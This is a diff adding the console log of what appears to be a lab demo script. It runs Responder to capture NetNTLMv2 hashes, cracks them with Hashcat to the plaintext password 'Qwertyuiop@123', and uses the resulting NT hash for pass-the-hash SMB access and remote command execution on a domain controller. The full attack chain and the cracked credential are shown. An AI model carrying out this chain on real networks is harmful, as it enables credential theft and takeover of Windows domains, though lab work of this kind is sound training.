@@ -1,0 +1,136 @@
+[*] Setting up demo environment in: /home/kalifive/demo_output
+[*] Terminating any existing Responder processes...
+[+] No active Responder processes found.
+[*] Clearing Responder cache/database/logs...
+[+] Cache cleared successfully.
+[*] Preparing Responder in /home/kalifive/demo_output/responder_logs...
+[*] Clearing Responder cache/database/logs in copy...
+[+] Cache cleared successfully.
+[*] Launching Responder on interface eth0 from dir /home/kalifive/demo_output/responder_logs/responder_copy...
+[DEBUG] Current working dir: /home/kalifive/demo_output/responder_logs/responder_copy
+[+] Responder launched with PID: 24634
+[DEBUG] Responder.db not created yet (will check during wait loop).
+[*] Waiting for hashes to be captured... (Timeout: 300 seconds)
+[!] On a Windows victim machine, try browsing to: \10.10.10.133\share
+[DEBUG] Responder.db not yet created.
+[*] Session log snippet: 10/25/2025 10:08:41 PM - Responder Started: ['Responder.py', '-I', 'eth0', '-wFd', '-v']
+.[DEBUG] DB exists. Row count (fullhash not null): 0
+.[DEBUG] DB exists. Row count (fullhash not null): 0
+.[DEBUG] DB exists. Row count (fullhash not null): 2
+
+[+] Success! Captured 2 hash(es) in DB.
+[*] Extracting raw NetNTLM hashes from Responder.db...
+[DEBUG] Total non-null fullhash rows: 2
+[DEBUG] Captured hash types written to: /home/kalifive/demo_output/hash_types.txt
+[+] Extracted 2 raw hashes from DB.
+[*] Cracking captured NetNTLMv2 hashes using Hashcat (wordlist: /home/kalifive/testhash.txt)...
+JOHN::CORP:45aa2b148b375bca:9f822895f520a7df42ea8a27435b9bf1:0101000000000000002bd0eefb45dc01ec37cc532f850b860000000002000800370054005500420001001e00570049004e002d00420051005200530042005a00590057004a004200390004003400570049004e002d00420051005200530042005a00590057004a00420039002e0037005400550042002e004c004f00430041004c000300140037005400550042002e004c004f00430041004c000500140037005400550042002e004c004f00430041004c0007000800002bd0eefb45dc0106000400020000000800300030000000000000000100000000200000a0c283750678696d9f2f782aa850152a8d065ec7dbf117d0676ffe9f226ac96a0a001000000000000000000000000000000000000900120063006900660073002f006d0061006b0065000000000000000000:Qwertyuiop@123
+JOHN::CORP:1f70eacc24aa75dd:b34f909bab5b934f7b76f0e82e9f40db:010100000000000035c7f9dbcd45dc012fcca1df1a5cfe6d0000000002000800370054005500420001001e00570049004e002d00420051005200530042005a00590057004a00420039000400140037005400550042002e004c004f00430041004c0003003400570049004e002d00420051005200530042005a00590057004a00420039002e0037005400550042002e004c004f00430041004c000500140037005400550042002e004c004f00430041004c000800300030000000000000000100000000200000a0c283750678696d9f2f782aa850152a8d065ec7dbf117d0676ffe9f226ac96a0a0010000000000000000000000000000000000009001e0048005400540050002f006d0061006b0065002e006c006f00630061006c000000000000000000:Qwertyuiop@123
+[DEBUG] Starting potfile parsing...
+[DEBUG] Processing potfile line: JOHN::CORP:45aa2b148b375bca:9f822895f520a7df42ea8a27435b9bf1:0101000000000000002bd0eefb45dc01ec37cc532f850b860000000002000800370054005500420001001e00570049004e002d00420051005200530042005a00590057004a004200390004003400570049004e002d00420051005200530042005a00590057004a00420039002e0037005400550042002e004c004f00430041004c000300140037005400550042002e004c004f00430041004c000500140037005400550042002e004c004f00430041004c0007000800002bd0eefb45dc0106000400020000000800300030000000000000000100000000200000a0c283750678696d9f2f782aa850152a8d065ec7dbf117d0676ffe9f226ac96a0a001000000000000000000000000000000000000900120063006900660073002f006d0061006b0065000000000000000000:Qwertyuiop@123
+[DEBUG] Matched - Username: JOHN, Plaintext: Qwertyuiop@123
+[DEBUG] NT hash computation attempted.
+[DEBUG] Wrote to cracked_file: JOHN:f52ff6a53b623ecc30b2e367346ddee6
+[DEBUG] Incremented cracked_count to 1
+[DEBUG] Processing potfile line: JOHN::CORP:1f70eacc24aa75dd:b34f909bab5b934f7b76f0e82e9f40db:010100000000000035c7f9dbcd45dc012fcca1df1a5cfe6d0000000002000800370054005500420001001e00570049004e002d00420051005200530042005a00590057004a00420039000400140037005400550042002e004c004f00430041004c0003003400570049004e002d00420051005200530042005a00590057004a00420039002e0037005400550042002e004c004f00430041004c000500140037005400550042002e004c004f00430041004c000800300030000000000000000100000000200000a0c283750678696d9f2f782aa850152a8d065ec7dbf117d0676ffe9f226ac96a0a0010000000000000000000000000000000000009001e0048005400540050002f006d0061006b0065002e006c006f00630061006c000000000000000000:Qwertyuiop@123
+[DEBUG] Matched - Username: JOHN, Plaintext: Qwertyuiop@123
+[DEBUG] NT hash computation attempted.
+[DEBUG] Wrote to cracked_file: JOHN:f52ff6a53b623ecc30b2e367346ddee6
+[DEBUG] Incremented cracked_count to 2
+[DEBUG] Loop completed. Total lines processed.
+[DEBUG] Parsing complete. Cracked count: 2
+[+] Cracked 2 hash(es) and computed NT hashes.
+[*] Attempting SMB access to 10.10.10.131 using cracked NT hashes...
+2025-10-25T16:39:14Z: [*] Testing JOHN@10.10.10.131
+SMB                      10.10.10.131    445    DC19             [*] Windows Server 2019 Standard Evaluation 17763 x64 (name:DC19) (domain:corp.local) (signing:True) (SMBv1:True)
+SMB                      10.10.10.131    445    DC19             [+] corp.local\JOHN:f52ff6a53b623ecc30b2e367346ddee6 (Pwn3d!)
+[DEBUG] Auth success detected (SMB connection established).
+2025-10-25T16:39:14Z: [OK]   Access successful for JOHN@10.10.10.131 (PTH demo complete)
+[DEBUG] Success count incremented to 1.
+[DEBUG] Entering command execution block.
+2025-10-25T16:39:14Z: [*] Executing command on target: whoami /all
+[DEBUG] Command execution attempted.
+SMB                      10.10.10.131    445    DC19             [*] Windows Server 2019 Standard Evaluation 17763 x64 (name:DC19) (domain:corp.local) (signing:True) (SMBv1:True)
+SMB                      10.10.10.131    445    DC19             [+] corp.local\JOHN:f52ff6a53b623ecc30b2e367346ddee6 (Pwn3d!)
+SMB                      10.10.10.131    445    DC19             [+] Executed command 
+SMB                      10.10.10.131    445    DC19             USER INFORMATION
+SMB                      10.10.10.131    445    DC19             ----------------
+SMB                      10.10.10.131    445    DC19             
+SMB                      10.10.10.131    445    DC19             User Name SID
+SMB                      10.10.10.131    445    DC19             ========= ==============================================
+SMB                      10.10.10.131    445    DC19             corp\john S-1-5-21-3925008556-1852563584-1133588037-1104
+SMB                      10.10.10.131    445    DC19             
+SMB                      10.10.10.131    445    DC19             
+SMB                      10.10.10.131    445    DC19             GROUP INFORMATION
+SMB                      10.10.10.131    445    DC19             -----------------
+SMB                      10.10.10.131    445    DC19             
+SMB                      10.10.10.131    445    DC19             Group Name                                  Type             SID                                           Attributes
+SMB                      10.10.10.131    445    DC19             =========================================== ================ ============================================= ===============================================================
+SMB                      10.10.10.131    445    DC19             Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+SMB                      10.10.10.131    445    DC19             BUILTIN\Administrators                      Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
+SMB                      10.10.10.131    445    DC19             BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+SMB                      10.10.10.131    445    DC19             BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+SMB                      10.10.10.131    445    DC19             NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+SMB                      10.10.10.131    445    DC19             NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+SMB                      10.10.10.131    445    DC19             NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+SMB                      10.10.10.131    445    DC19             CORP\Domain Controllers                     Group            S-1-5-21-3925008556-1852563584-1133588037-516 Mandatory group, Enabled by default, Enabled group
+SMB                      10.10.10.131    445    DC19             CORP\Denied RODC Password Replication Group Alias            S-1-5-21-3925008556-1852563584-1133588037-572 Mandatory group, Enabled by default, Enabled group, Local Group
+SMB                      10.10.10.131    445    DC19             NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+SMB                      10.10.10.131    445    DC19             Mandatory Label\High Mandatory Level        Label            S-1-16-12288
+SMB                      10.10.10.131    445    DC19             
+SMB                      10.10.10.131    445    DC19             
+SMB                      10.10.10.131    445    DC19             PRIVILEGES INFORMATION
+SMB                      10.10.10.131    445    DC19             ----------------------
+SMB                      10.10.10.131    445    DC19             
+SMB                      10.10.10.131    445    DC19             Privilege Name                            Description                                                        State
+SMB                      10.10.10.131    445    DC19             ========================================= ================================================================== =======
+SMB                      10.10.10.131    445    DC19             SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SMB                      10.10.10.131    445    DC19             SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SMB                      10.10.10.131    445    DC19             SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SMB                      10.10.10.131    445    DC19             SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SMB                      10.10.10.131    445    DC19             SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SMB                      10.10.10.131    445    DC19             SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SMB                      10.10.10.131    445    DC19             SeSystemtimePrivilege                     Change the system time                                             Enabled
+SMB                      10.10.10.131    445    DC19             SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SMB                      10.10.10.131    445    DC19             SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SMB                      10.10.10.131    445    DC19             SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SMB                      10.10.10.131    445    DC19             SeBackupPrivilege                         Back up files and directories                                      Enabled
+SMB                      10.10.10.131    445    DC19             SeRestorePrivilege                        Restore files and directories                                      Enabled
+SMB                      10.10.10.131    445    DC19             SeShutdownPrivilege                       Shut down the system                                               Enabled
+SMB                      10.10.10.131    445    DC19             SeDebugPrivilege                          Debug programs                                                     Enabled
+SMB                      10.10.10.131    445    DC19             SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SMB                      10.10.10.131    445    DC19             SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SMB                      10.10.10.131    445    DC19             SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SMB                      10.10.10.131    445    DC19             SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SMB                      10.10.10.131    445    DC19             SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SMB                      10.10.10.131    445    DC19             SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SMB                      10.10.10.131    445    DC19             SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SMB                      10.10.10.131    445    DC19             SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SMB                      10.10.10.131    445    DC19             SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SMB                      10.10.10.131    445    DC19             SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SMB                      10.10.10.131    445    DC19             SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SMB                      10.10.10.131    445    DC19             SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+SMB                      10.10.10.131    445    DC19             
+SMB                      10.10.10.131    445    DC19             
+SMB                      10.10.10.131    445    DC19             USER CLAIMS INFORMATION
+SMB                      10.10.10.131    445    DC19             -----------------------
+SMB                      10.10.10.131    445    DC19             
+SMB                      10.10.10.131    445    DC19             User claims unknown.
+SMB                      10.10.10.131    445    DC19             
+SMB                      10.10.10.131    445    DC19             Kerberos support for Dynamic Access Control on this device has been disabled.
+2025-10-25T16:39:14Z: [CMD SUCCESS] Command output logged above.
+[DEBUG] Exited command execution block.
+
+=== Summary ===
+Target IP: 10.10.10.131
+Captured Hashes: 2
+Cracked Hashes: 2
+Successes: 1
+Failures:  0
+Crack Failures:  0
+-------------------
+Full logs written to: /home/kalifive/demo_output/lateral_log.txt
+Captured hashes stored in: /home/kalifive/demo_output/captured_hashes.txt
+Cracked hashes stored in: /home/kalifive/demo_output/cracked_hashes.txt
+Responder logs are in: /home/kalifive/demo_output/responder_logs
+Demo output directory: /home/kalifive/demo_output
